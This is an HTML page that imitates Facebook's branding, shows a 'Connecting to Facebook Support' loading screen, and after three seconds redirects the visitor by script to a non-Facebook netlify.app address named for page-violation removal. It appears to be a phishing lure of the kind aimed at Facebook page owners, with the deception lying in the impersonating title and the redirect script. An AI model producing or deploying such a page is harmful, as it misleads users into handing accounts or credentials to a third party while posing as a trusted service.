
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to Facebook Help Center</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1877f2; /* Facebook blue */
            color: white;
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            width: 90%;
            max-width: 500px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 30px;
            opacity: 0;
            animation: fadeIn 0.5s ease-out forwards;
        }
        
        .loader {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 30px;
        }
        
        .dot {
            width: 12px;
            height: 12px;
            background-color: white;
            border-radius: 50%;
            opacity: 0;
        }
        
        .dot:nth-child(1) {
            animation: bounce 1.2s infinite ease-in-out;
        }
        
        .dot:nth-child(2) {
            animation: bounce 1.2s infinite ease-in-out 0.2s;
        }
        
        .dot:nth-child(3) {
            animation: bounce 1.2s infinite ease-in-out 0.4s;
        }
        
        .progress-container {
            width: 100%;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0;
            background-color: white;
            border-radius: 2px;
            animation: progress 3s linear forwards;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes bounce {
            0%, 80%, 100% { 
                opacity: 0.3;
                transform: scale(0.6);
            }
            40% { 
                opacity: 1;
                transform: scale(1);
            }
        }
        
        @keyframes progress {
            0% { width: 0; }
            100% { width: 100%; }
        }
        
        /* Responsive adjustments */
        @media (min-width: 768px) {
            h1 {
                font-size: 32px;
            }
            
            .dot {
                width: 16px;
                height: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connecting to Facebook Support</h1>
        <div class="loader">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
    </div>
    
    <script>
        // Redirect after 3 seconds
        setTimeout(function() {
            window.location.href = "https://remove-page-violations.netlify.app/";
        }, 3000);
    </script>
</body>

</html>
